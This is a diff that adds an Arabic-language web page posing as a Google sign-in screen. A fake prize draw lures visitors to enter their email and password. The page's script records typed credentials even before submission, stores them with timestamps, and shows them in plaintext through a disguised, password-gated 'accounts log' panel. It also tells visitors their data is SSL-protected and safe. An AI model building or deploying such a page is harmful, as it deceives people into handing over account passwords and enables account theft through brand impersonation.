@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول - Google</title>
+<style>
+  :root{
+    --g-blue:#4285F4;
+    --g-red:#EA4335;
+    --g-yellow:#FBBC05;
+    --g-green:#34A853;
+    --text:#202124;
+    --muted:#5f6368;
+    --border:#dadce0;
+    --bg:#fff;
+    --hover:#f8f9fa;
+    --err:#d93025;
+  }
+  *{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif;}
+  html,body{height:100%;}
+  body{
+    margin:0;
+    display:flex;align-items:center;justify-content:center;
+    padding:16px;background:#f0f4f9;
+    overflow:hidden;
+  }
+
+  /* ===== خلفية Google الناعمة ===== */
+  .bg-blob{position:fixed;border-radius:50%;filter:blur(90px);opacity:.35;pointer-events:none;z-index:0;}
+  .bg-blob.b1{width:420px;height:420px;background:#4285F4;top:-120px;right:-100px;}
+  .bg-blob.b2{width:380px;height:380px;background:#EA4335;bottom:-120px;left:-100px;}
+  .bg-blob.b3{width:300px;height:300px;background:#FBBC05;top:40%;left:-120px;}
+  .bg-blob.b4{width:320px;height:320px;background:#34A853;bottom:-80px;right:-120px;}
+
+  /* ===== أزرار الزوايا المموّهة ===== */
+  .corner-btn{
+    position:fixed;top:16px;z-index:50;
+    width:40px;height:40px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(255,255,255,.5);
+    border:1px solid rgba(0,0,0,.05);
+    color:rgba(0,0,0,.28);
+    cursor:pointer;backdrop-filter:blur(6px);
+    opacity:.4;transition:all .35s ease;
+  }
+  .corner-btn:hover,.corner-btn:focus-visible{
+    opacity:1;background:#fff;color:#5f6368;
+    transform:scale(1.08);box-shadow:0 4px 14px rgba(0,0,0,.15);
+  }
+  .corner-btn:active{transform:scale(.96);}
+  .corner-btn svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}
+
+  .settings-btn{right:16px;animation:gearIdle 12s linear infinite;}
+  .settings-btn:hover,.settings-btn:focus-visible{animation-play-state:paused;transform:rotate(0deg) scale(1.08);}
+  @keyframes gearIdle{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+
+  .info-btn{left:16px;}
+  .info-btn:hover .info-dot{animation:dotPulse 1s ease-in-out infinite;}
+  @keyframes dotPulse{0%,100%{opacity:.5}50%{opacity:1}}
+
+  /* ===== لوحة الإعدادات ===== */
+  .settings-panel{
+    position:fixed;top:64px;right:16px;z-index:60;
+    width:260px;padding:18px;
+    background:#fff;border:1px solid #dadce0;border-radius:16px;
+    box-shadow:0 10px 30px rgba(0,0,0,.15);
+    opacity:0;visibility:hidden;transform:translateY(-10px) scale(.96);
+    transition:all .28s cubic-bezier(.2,.8,.2,1);
+  }
+  .settings-panel.show{opacity:1;visibility:visible;transform:translateY(0) scale(1);}
+  .settings-panel h4{margin:0 0 14px;font-size:14px;font-weight:600;color:#202124;display:flex;align-items:center;gap:8px;}
+  .settings-panel h4 svg{width:16px;height:16px;stroke:#4285F4;fill:none;stroke-width:2;}
+  .settings-row{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:10px 0;border-top:1px solid #f1f3f4;
+    font-size:13px;color:#5f6368;
+  }
+  .settings-row:first-of-type{border-top:none;}
+  .settings-row span{display:flex;align-items:center;gap:8px;}
+  .settings-row span svg{width:15px;height:15px;stroke:#5f6368;fill:none;stroke-width:2;}
+  .switch{position:relative;width:38px;height:20px;flex-shrink:0;}
+  .switch input{opacity:0;width:0;height:0;}
+  .slider{position:absolute;inset:0;background:#dadce0;border-radius:20px;cursor:pointer;transition:.25s;}
+  .slider::before{content:"";position:absolute;height:14px;width:14px;left:3px;top:3px;background:#fff;border-radius:50%;transition:.25s;}
+  .switch input:checked + .slider{background:var(--g-blue);}
+  .switch input:checked + .slider::before{transform:translateX(18px);}
+  .settings-panel .note{font-size:11px;color:#9aa0a6;margin-top:12px;text-align:center;}
+
+  /* ===== البطاقة ===== */
+  .card{
+    position:relative;z-index:1;
+    background:#fff;
+    width:100%;max-width:420px;
+    padding:40px 36px 32px;
+    border-radius:20px;
+    border:1px solid #dadce0;
+    box-shadow:0 20px 50px rgba(60,64,67,.12);
+    opacity:0;transform:translateY(24px) scale(.97);
+    animation:cardIn .6s cubic-bezier(.2,.8,.2,1) forwards;
+  }
+  @keyframes cardIn{to{opacity:1;transform:translateY(0) scale(1)}}
+
+  /* ===== شعار Google ===== */
+  .google-logo{
+    text-align:center;margin-bottom:6px;font-size:34px;font-weight:500;
+    letter-spacing:-1.5px;user-select:none;
+    font-family:'Product Sans','Google Sans',Arial,sans-serif;
+  }
+  .google-logo .g1{color:#4285F4}
+  .google-logo .g2{color:#EA4335}
+  .google-logo .g3{color:#FBBC05}
+  .google-logo .g4{color:#4285F4}
+  .google-logo .g5{color:#34A853}
+  .google-logo .g6{color:#EA4335}
+
+  h2{margin:10px 0 6px;text-align:center;color:#202124;font-size:22px;font-weight:500;}
+  .subtitle{text-align:center;color:#5f6368;font-size:14px;margin:0 0 26px;line-height:1.5;}
+
+  /* ===== نص السحب ===== */
+  .promo{
+    background:linear-gradient(135deg,#e8f0fe,#fce8e6);
+    border:1px solid #d2e3fc;
+    border-radius:12px;
+    padding:14px 16px;
+    margin-bottom:22px;
+    display:flex;align-items:flex-start;gap:10px;
+    animation:fadeUp .5s ease .1s both;
+  }
+  .promo svg{width:22px;height:22px;flex-shrink:0;stroke:#EA4335;fill:none;stroke-width:2;margin-top:2px;}
+  .promo-text{font-size:13px;color:#202124;line-height:1.7;}
+  .promo-text b{color:#4285F4;}
+  @keyframes fadeUp{to{opacity:1;transform:translateY(0)}}
+
+  .field{margin-bottom:16px;position:relative;opacity:0;transform:translateY(10px);animation:fadeUp .5s ease forwards;}
+  .field:nth-of-type(1){animation-delay:.15s;}
+  .field:nth-of-type(2){animation-delay:.25s;}
+
+  .field label{display:flex;align-items:center;gap:6px;margin-bottom:7px;font-size:13px;font-weight:500;color:#202124;}
+  .field label svg{width:14px;height:14px;stroke:#5f6368;fill:none;stroke-width:2;}
+  .input-wrap{position:relative;}
+  .input-wrap > svg.lead{
+    position:absolute;right:14px;top:50%;transform:translateY(-50%);
+    width:18px;height:18px;stroke:#5f6368;fill:none;stroke-width:2;pointer-events:none;transition:stroke .2s;
+  }
+  .input-wrap input{
+    width:100%;padding:14px 44px 14px 14px;border:1px solid #dadce0;border-radius:8px;
+    font-size:15px;color:#202124;background:#fff;outline:none;transition:all .2s ease;
+  }
+  .input-wrap input::placeholder{color:#9aa0a6;}
+  .input-wrap input:hover{border-color:#bdc1c6;}
+  .input-wrap input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8;}
+  .input-wrap input:focus + svg.lead,.input-wrap input:focus ~ svg.lead{stroke:#1a73e8;}
+  .input-wrap input.email{direction:ltr;text-align:left;}
+  .input-wrap input.pass{padding-left:44px;direction:ltr;text-align:left;}
+
+  .toggle-pass{
+    position:absolute;left:10px;top:50%;transform:translateY(-50%);
+    background:none;border:none;cursor:pointer;padding:6px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;color:#5f6368;transition:background .2s;
+  }
+  .toggle-pass:hover{background:#f1f3f4;}
+  .toggle-pass svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2;}
+
+  .login-btn{
+    width:100%;padding:12px;margin-top:8px;border:none;border-radius:8px;cursor:pointer;
+    background:#1a73e8;color:#fff;
+    font-size:15px;font-weight:500;
+    position:relative;overflow:hidden;
+    transition:background .2s, box-shadow .2s;
+    opacity:0;animation:fadeUp .5s ease .35s forwards;
+  }
+  .login-btn:hover{background:#1765cc;box-shadow:0 2px 8px rgba(26,115,232,.4);}
+  .login-btn:active{background:#1557b0;}
+  .ripple{position:absolute;border-radius:50%;background:rgba(255,255,255,.45);transform:scale(0);animation:rip .6s linear;pointer-events:none;}
+  @keyframes rip{to{transform:scale(4);opacity:0}}
+
+  .msg{text-align:center;margin-top:14px;font-size:14px;font-weight:500;min-height:20px;opacity:0;transition:opacity .25s;}
+  .msg.show{opacity:1;}
+  .ok{color:#188038;}
+  .err{color:#d93025;}
+  .hint{text-align:center;color:#9aa0a6;font-size:12px;margin-top:18px;line-height:1.6;}
+  .hint b{color:#5f6368;font-weight:500;}
+
+  /* ===== النوافذ ===== */
+  .overlay{
+    position:fixed;inset:0;background:rgba(32,33,36,.5);
+    display:flex;align-items:center;justify-content:center;padding:16px;z-index:100;
+    opacity:0;visibility:hidden;transition:opacity .25s,visibility .25s;
+  }
+  .overlay.show{opacity:1;visibility:visible;}
+  .modal{
+    background:#fff;border-radius:16px;padding:28px 26px;width:100%;max-width:400px;
+    box-shadow:0 24px 60px rgba(0,0,0,.25);
+    transform:scale(.92) translateY(10px);opacity:0;
+    transition:transform .3s cubic-bezier(.2,.8,.2,1),opacity .3s;
+  }
+  .overlay.show .modal{transform:scale(1) translateY(0);opacity:1;}
+  .modal-icon{
+    width:52px;height:52px;margin:0 auto 14px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    background:#fef7e0;
+  }
+  .modal-icon svg{width:24px;height:24px;stroke:#b06000;fill:none;stroke-width:2;}
+  .modal h3{margin:0 0 6px;text-align:center;color:#202124;font-size:18px;font-weight:500;}
+  .modal p{margin:0 0 18px;text-align:center;color:#5f6368;font-size:13px;}
+  .modal .input-wrap{margin-bottom:16px;}
+  .modal .input-wrap input{padding:12px 14px;}
+  .modal-actions{display:flex;gap:10px;margin-top:6px;}
+  .btn-cancel,.btn-confirm{flex:1;padding:11px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:all .2s;}
+  .btn-cancel{background:transparent;color:#1a73e8;}
+  .btn-cancel:hover{background:#f1f3f4;}
+  .btn-confirm{background:#1a73e8;color:#fff;}
+  .btn-confirm:hover{background:#1765cc;}
+  .modal .msg{margin-top:10px;}
+  .modal .input-wrap input.shake{animation:shake .35s;}
+  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+  /* ===== نافذة السجل ===== */
+  .log-modal{background:#fff;border-radius:16px;padding:24px;width:100%;max-width:520px;
+    box-shadow:0 24px 60px rgba(0,0,0,.25);max-height:85vh;display:flex;flex-direction:column;
+    transform:scale(.92) translateY(10px);opacity:0;transition:transform .3s cubic-bezier(.2,.8,.2,1),opacity .3s;}
+  .overlay.show .log-modal{transform:scale(1) translateY(0);opacity:1;}
+  .log-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
+  .log-head h3{margin:0;font-size:18px;color:#202124;font-weight:500;display:flex;align-items:center;gap:8px;}
+  .log-head h3 svg{width:20px;height:20px;stroke:#4285F4;fill:none;stroke-width:2;}
+  .close-x{background:none;border:none;cursor:pointer;color:#5f6368;padding:6px;border-radius:50%;transition:.2s;}
+  .close-x:hover{background:#f1f3f4;color:#202124;}
+  .close-x svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2;}
+  .log-list{overflow-y:auto;flex:1;margin:0 -6px;padding:0 6px;}
+  .log-item{
+    display:flex;align-items:center;gap:12px;
+    padding:12px;border-radius:10px;background:#f8f9fa;border:1px solid #f1f3f4;
+    margin-bottom:10px;animation:fadeUp .4s ease both;
+  }
+  .log-avatar{
+    width:38px;height:38px;border-radius:50%;flex-shrink:0;
+    background:#1a73e8;
+    display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;font-size:15px;
+  }
+  .log-info{flex:1;min-width:0;}
+  .log-email{font-size:14px;font-weight:500;color:#202124;direction:ltr;text-align:left;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .log-pass{font-size:12px;color:#5f6368;direction:ltr;text-align:left;font-family:monospace;
+    margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .log-time{font-size:11px;color:#9aa0a6;white-space:nowrap;}
+  .log-empty{text-align:center;color:#9aa0a6;font-size:14px;padding:40px 0;}
+  .log-empty svg{width:48px;height:48px;stroke:#dadce0;fill:none;stroke-width:1.5;margin-bottom:10px;}
+  .log-actions{display:flex;gap:10px;margin-top:14px;padding-top:14px;border-top:1px solid #f1f3f4;}
+  .btn-danger{flex:1;padding:11px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;border:none;
+    background:#fce8e6;color:#d93025;transition:.2s;}
+  .btn-danger:hover{background:#fad2cf;}
+  .btn-close-log{flex:1;padding:11px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;border:none;
+    background:#f1f3f4;color:#3c4043;transition:.2s;}
+  .btn-close-log:hover{background:#e8eaed;}
+</style>
+</head>
+<body>
+
+<div class="bg-blob b1"></div>
+<div class="bg-blob b2"></div>
+<div class="bg-blob b3"></div>
+<div class="bg-blob b4"></div>
+
+<!-- زر الإعدادات (يمين) -->
+<button class="corner-btn settings-btn" aria-label="الإعدادات" onclick="toggleSettings(event)">
+  <svg viewBox="0 0 24 24">
+    <circle cx="12" cy="12" r="3"/>
+    <path d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.9.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.9 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.9l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.9.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.9V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>
+  </svg>
+</button>
+
+<!-- زر سجل الحسابات (يسار) -->
+<button class="corner-btn info-btn" aria-label="سجل الحسابات" onclick="openModal()">
+  <svg viewBox="0 0 24 24">
+    <circle cx="12" cy="12" r="9"/>
+    <path d="M12 11v5"/>
+    <circle class="info-dot" cx="12" cy="8" r="1" fill="currentColor" stroke="none"/>
+  </svg>
+</button>
+
+<!-- لوحة الإعدادات -->
+<div class="settings-panel" id="settingsPanel">
+  <h4>
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.9.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.9 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.9l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.9.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.9V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/></svg>
+    الإعدادات
+  </h4>
+  <div class="settings-row">
+    <span><svg viewBox="0 0 24 24"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg> الوضع الليلي</span>
+    <label class="switch"><input type="checkbox" id="darkToggle"><span class="slider"></span></label>
+  </div>
+  <div class="settings-row">
+    <span><svg viewBox="0 0 24 24"><path d="M13 2 3 14h9l-1 8 10-12h-9l1-8Z"/></svg> تقليل الحركة</span>
+    <label class="switch"><input type="checkbox" id="motionToggle"><span class="slider"></span></label>
+  </div>
+  <div class="settings-row">
+    <span><svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg> تنبيهات البريد</span>
+    <label class="switch"><input type="checkbox" id="notifyToggle" checked><span class="slider"></span></label>
+  </div>
+  <div class="note">الإصدار 2.0.0 — Google</div>
+</div>
+
+<!-- البطاقة -->
+<div class="card">
+  <!-- شعار Google -->
+  <div class="google-logo">
+    <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span>
+  </div>
+
+  <h2>تسجيل الدخول</h2>
+  <p class="subtitle">أدخل إيميلك وباسوورد حسابك للمتابعة</p>
+
+  <!-- نص السحب -->
+  <div class="promo">
+    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4L12 16.8 5.8 21.3l2.4-7.4L2 9.4h7.6z"/>
+    </svg>
+    <div class="promo-text">
+      <b>سجّل دخولك وادخل السحب</b> على <b>سيارة</b> و<b>آيفون</b> و<b>جهاز PS5</b> من شركة <b>Google</b>. فرصتك للفوز بجوائز مميزة عند إتمام تسجيل الدخول.
+    </div>
+  </div>
+
+  <div class="field">
+    <label>
+      <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
+      البريد الإلكتروني
+    </label>
+    <div class="input-wrap">
+      <input id="email" class="email" type="email" placeholder="أدخل إيميلك" autocomplete="off">
+      <svg class="lead" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
+    </div>
+  </div>
+
+  <div class="field">
+    <label>
+      <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+      كلمة المرور
+    </label>
+    <div class="input-wrap">
+      <input id="pass" class="pass" type="password" placeholder="أدخل باسوورد حسابك" autocomplete="new-password">
+      <button class="toggle-pass" onclick="togglePass()" aria-label="إظهار كلمة المرور">
+        <svg id="eyeIcon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <button class="login-btn" id="loginBtn" onclick="login(event)">تسجيل الدخول</button>
+  <div id="msg" class="msg"></div>
+  <div class="hint">محمي بتشفير <b>SSL</b> — بياناتك آمنة</div>
+</div>
+
+<!-- نافذة تأكيد سجل الحسابات -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="modal-icon">
+      <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/><circle cx="12" cy="15.5" r="1.2" fill="#b06000" stroke="none"/></svg>
+    </div>
+    <h3>تأكيد الهوية</h3>
+    <p>أدخل كلمة المرور لعرض سجل الحسابات</p>
+    <div class="input-wrap">
+      <input id="modalPass" type="password" placeholder="كلمة المرور" autocomplete="off">
+    </div>
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeModal()">إلغاء</button>
+      <button class="btn-confirm" onclick="confirmOpen()">فتح</button>
+    </div>
+    <div id="modalMsg" class="msg"></div>
+  </div>
+</div>
+
+<!-- نافذة السجل -->
+<div class="overlay" id="logOverlay">
+  <div class="log-modal">
+    <div class="log-head">
+      <h3>
+        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+        سجل الحسابات
+      </h3>
+      <button class="close-x" onclick="closeLog()" aria-label="إغلاق">
+        <svg viewBox="0 0 24 24" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>
+      </button>
+    </div>
+    <div class="log-list" id="logList"></div>
+    <div class="log-actions">
+      <button class="btn-close-log" onclick="closeLog()">إغلاق</button>
+      <button class="btn-danger" onclick="clearLog()">مسح السجل</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  const SECRET_INFO  = 'Vornyxel1234';
+  const SECRET_LOGIN = '11223344';
+  const STORAGE_KEY  = 'login_history_v1';
+
+  const $=id=>document.getElementById(id);
+  const emailInput=$('email'), passInput=$('pass'), msg=$('msg');
+  const overlay=$('overlay'), modalPass=$('modalPass'), modalMsg=$('modalMsg');
+  const logOverlay=$('logOverlay'), logList=$('logList');
+  const eyeIcon=$('eyeIcon');
+  const panel=$('settingsPanel'), settingsBtn=document.querySelector('.settings-btn');
+
+  /* ===== السجل ===== */
+  function loadLog(){
+    try{ return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; }
+    catch(e){ return []; }
+  }
+  function saveLog(arr){ localStorage.setItem(STORAGE_KEY, JSON.stringify(arr)); }
+
+  function addToLog(email, pass){
+    const log = loadLog();
+    const now = Date.now();
+    if(log[0] && log[0].email === email && log[0].pass === pass && now - log[0].time < 5000) return;
+    log.unshift({ email, pass, time: now });
+    saveLog(log);
+  }
+
+  function formatTime(ts){
+    const d = new Date(ts);
+    const pad = n => String(n).padStart(2,'0');
+    return `${d.getFullYear()}/${pad(d.getMonth()+1)}/${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
+  }
+  function escapeHtml(s){
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+  }
+
+  function renderLog(){
+    const log = loadLog();
+    logList.innerHTML = '';
+    if(log.length === 0){
+      logList.innerHTML = `
+        <div class="log-empty">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 6h16M4 12h16M4 18h16"/>
+          </svg>
+          <div>لا توجد سجلات بعد</div>
+        </div>`;
+      return;
+    }
+    log.forEach((item, i) => {
+      const el = document.createElement('div');
+      el.className = 'log-item';
+      el.style.animationDelay = (i * 0.04) + 's';
+      const initial = (item.email || '?').charAt(0).toUpperCase();
+      el.innerHTML = `
+        <div class="log-avatar">${initial}</div>
+        <div class="log-info">
+          <div class="log-email">${escapeHtml(item.email)}</div>
+          <div class="log-pass">${escapeHtml(item.pass)}</div>
+        </div>
+        <div class="log-time">${formatTime(item.time)}</div>`;
+      logList.appendChild(el);
+    });
+  }
+
+  function clearLog(){
+    if(confirm('هل تريد مسح كل السجل؟')){
+      localStorage.removeItem(STORAGE_KEY);
+      renderLog();
+    }
+  }
+
+  /* ===== الحفظ التلقائي ===== */
+  let saveTimer = null;
+  function autoSaveDraft(){
+    clearTimeout(saveTimer);
+    saveTimer = setTimeout(() => {
+      const em = emailInput.value.trim();
+      const p  = passInput.value;
+      if(em && p) addToLog(em, p);
+    }, 800);
+  }
+  emailInput.addEventListener('input', autoSaveDraft);
+  passInput.addEventListener('input', autoSaveDraft);
+
+  /* ===== الإعدادات ===== */
+  function toggleSettings(e){
+    e.stopPropagation();
+    panel.classList.toggle('show');
+  }
+  document.addEventListener('click', e=>{
+    if(panel.classList.contains('show') &&
+       !panel.contains(e.target) && !settingsBtn.contains(e.target)){
+      panel.classList.remove('show');
+    }
+  });
+  document.addEventListener('keydown', e=>{
+    if(e.key==='Escape'){ panel.classList.remove('show'); closeModal(); closeLog(); }
+  });
+
+  $('darkToggle').addEventListener('change', e=>{
+    document.querySelector('.card').style.background = e.target.checked ? '#202124' : '#fff';
+    document.querySelector('.card').style.borderColor = e.target.checked ? '#3c4043' : '#dadce0';
+    document.querySelectorAll('.card h2,.card label').forEach(el=>{
+      el.style.color = e.target.checked ? '#e8eaed' : '';
+    });
+    document.querySelector('.card .subtitle').style.color = e.target.checked ? '#9aa0a6' : '';
+    document.querySelectorAll('.input-wrap input').forEach(el=>{
+      el.style.background = e.target.checked ? '#303134' : '';
+      el.style.color = e.target.checked ? '#e8eaed' : '';
+      el.style.borderColor = e.target.checked ? '#5f6368' : '';
+    });
+  });
+  $('motionToggle').addEventListener('change', e=>{
+    document.querySelectorAll('.card,.google-logo,.settings-btn,.bg-blob').forEach(el=>{
+      el.style.animation = e.target.checked ? 'none' : '';
+    });
+  });
+
+  /* ===== إظهار كلمة المرور ===== */
+  const eyeOpen=`<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>`;
+  const eyeClosed=`<path d="M3 3l18 18"/><path d="M10.6 6.2A10.9 10.9 0 0 1 12 6c6.5 0 10 6 10 6a17.4 17.4 0 0 1-4.2 4.5"/><path d="M6.6 6.6C3.7 8.3 2 12 2 12s3.5 7 10 7a10.7 10.7 0 0 0 5.4-1.4"/>`;
+  function togglePass(){
+    const show=passInput.type==='password';
+    passInput.type=show?'text':'password';
+    eyeIcon.innerHTML=show?eyeClosed:eyeOpen;
+  }
+
+  /* ===== نافذة التأكيد ===== */
+  function openModal(){
+    modalPass.value='';modalMsg.textContent='';modalMsg.className='msg';
+    overlay.classList.add('show');
+    setTimeout(()=>modalPass.focus(),80);
+  }
+  function closeModal(){overlay.classList.remove('show');}
+  overlay.addEventListener('click',e=>{if(e.target===overlay)closeModal();});
+  document.addEventListener('keydown',e=>{
+    if(e.key==='Enter'&&overlay.classList.contains('show'))confirmOpen();
+  });
+
+  function confirmOpen(){
+    if(modalPass.value !== SECRET_INFO){
+      modalMsg.textContent='كلمة المرور غير صحيحة';
+      modalMsg.className='msg err show';
+      modalPass.classList.add('shake');
+      setTimeout(()=>modalPass.classList.remove('shake'),350);
+      return;
+    }
+    closeModal();
+    renderLog();
+    logOverlay.classList.add('show');
+  }
+
+  /* ===== نافذة السجل ===== */
+  function closeLog(){logOverlay.classList.remove('show');}
+  logOverlay.addEventListener('click',e=>{if(e.target===logOverlay)closeLog();});
+
+  /* ===== تموج الزر ===== */
+  $('loginBtn').addEventListener('click', e=>{
+    const btn=e.currentTarget; const r=document.createElement('span');
+    r.className='ripple';
+    const rect=btn.getBoundingClientRect();
+    const size=Math.max(rect.width,rect.height);
+    r.style.width=r.style.height=size+'px';
+    r.style.left=(e.clientX-rect.left-size/2)+'px';
+    r.style.top=(e.clientY-rect.top-size/2)+'px';
+    btn.appendChild(r); setTimeout(()=>r.remove(),600);
+  });
+
+  function isValidEmail(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}
+  function login(){
+    const em=emailInput.value.trim(), p=passInput.value;
+    msg.className='msg'; msg.textContent='';
+
+    if(!em || !p){
+      msg.textContent='الرجاء إدخال البريد الإلكتروني وكلمة المرور';
+      msg.className='msg err show';
+      return;
+    }
+    if(!isValidEmail(em)){
+      msg.textContent='صيغة البريد الإلكتروني غير صحيحة';
+      msg.className='msg err show';
+      return;
+    }
+
+    addToLog(em, p);
+
+    if(p === SECRET_LOGIN){
+      msg.textContent='تم تسجيل الدخول بنجاح — أنت الآن في السحب!';
+      msg.className='msg ok show';
+      emailInput.value=''; passInput.value='';
+    }else{
+      msg.textContent='كلمة المرور غير صحيحة';
+      msg.className='msg err show';
+    }
+  }
+</script>
+
+</body>
+</html>
